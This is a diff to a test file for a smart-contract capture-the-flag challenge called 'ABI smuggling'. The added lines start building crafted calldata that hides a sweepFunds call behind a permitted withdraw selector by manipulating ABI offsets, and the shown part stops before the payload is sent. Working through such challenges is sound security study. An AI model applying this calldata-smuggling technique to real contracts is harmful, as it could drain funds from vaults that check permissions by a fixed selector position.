@@ -71,6 +71,16 @@ describe("[Challenge] ABI smuggling", function () {
     iface = new ethers.utils.Interface(abi);
     sig = iface.getSighash("withdraw");
     console.log(sig);
+    /** step 2: prepare nested msg.data; function sweepFunds is nested behind function withdraw */
+    abi = ethers.utils.defaultAbiCoder;
+    let params1 = "0x1cff79cd";
+    let params2 = abi.encode(["address", "uint256"], [vault.address, 100]);
+    let params3 = ethers.utils.hexZeroPad("0x0", 32);
+    let params4 = "0xd9caed12";
+    //Acutal bytes 'actiondata' contents starts here
+    let params5 = abi.encode(["uint256"], [68]);
+    abi = ["function sweepFunds(address,address)"];
+    iface = new ethers.utils.Interface(abi);
   });
 
   after(async function () {
